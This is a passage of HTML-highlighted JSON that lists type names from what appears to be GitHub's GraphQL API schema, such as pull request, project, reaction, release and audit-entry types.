class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedDiscussionPattern&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedIssue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedIssueConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PinnedIssueEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PreciseDateTime&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PrivateRepositoryForkingDisableAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PrivateRepositoryForkingEnableAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProfileItemShowcase&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProfileOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Project&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectCard&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectCardArchivedState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectCardConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectCardEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectCardItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectCardState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectColumn&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectColumnConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectColumnEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectColumnPurpose&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextFieldCommon&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextFieldConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextFieldEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextFieldType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItemConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItemContent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItemEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItemFieldValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItemFieldValueConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextItemFieldValueEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectNextOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectProgress&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ProjectTemplate&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PublicKey&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PublicKeyConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PublicKeyEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequest&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestChangedFile&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestChangedFileConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestChangedFileEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestCommit&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestCommitCommentThread&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestCommitConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestCommitEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestContributionsByRepository&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestMergeMethod&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReview&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewCommentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewCommentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewCommentState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewContributionsByRepository&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewDecision&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewThread&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewThreadConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestReviewThreadEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestRevisionMarker&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTemplate&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineItemEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineItems&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineItemsConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineItemsEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestTimelineItemsItemType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PullRequestUpdateState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Push&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PushAllowance&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PushAllowanceActor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PushAllowanceConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;PushAllowanceEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Query&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RateLimit&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Reactable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactingUserConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactingUserEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Reaction&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactionContent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactionGroup&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactionOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactionOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Reactor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactorConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactorEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReadyForReviewEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Ref&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RefConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RefEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RefOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RefOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RefUpdateRule&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReferencedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReferencedSubject&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RegenerateEnterpriseIdentityProviderRecoveryCodesInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RegenerateEnterpriseIdentityProviderRecoveryCodesPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RegenerateVerifiableDomainTokenInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RegenerateVerifiableDomainTokenPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RejectDeploymentsInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RejectDeploymentsPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Release&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseAsset&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseAssetConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseAssetEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveAssigneesFromAssignableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveAssigneesFromAssignablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseAdminInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseAdminPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseIdentityProviderInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseIdentityProviderPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseOrganizationInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseOrganizationPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseSupportEntitlementInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseSupportEntitlementPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveLabelsFromLabelableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveLabelsFromLabelablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveOutsideCollaboratorInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveOutsideCollaboratorPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveReactionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveReactionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveStarInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveStarPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveUpvoteInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveUpvotePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemovedFromProjectEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RenamedTitleEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RenamedTitleSubject&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReopenIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReopenIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReopenPullRequestInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReopenPullRequestPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReopenedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoAccessAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoAccessAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoAddMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoAddMemberAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoAddTopicAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoArchivedAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoArchivedAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoChangeMergeSettingAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoChangeMergeSettingAuditEntryMergeType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigDisableAnonymousGitAccessAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        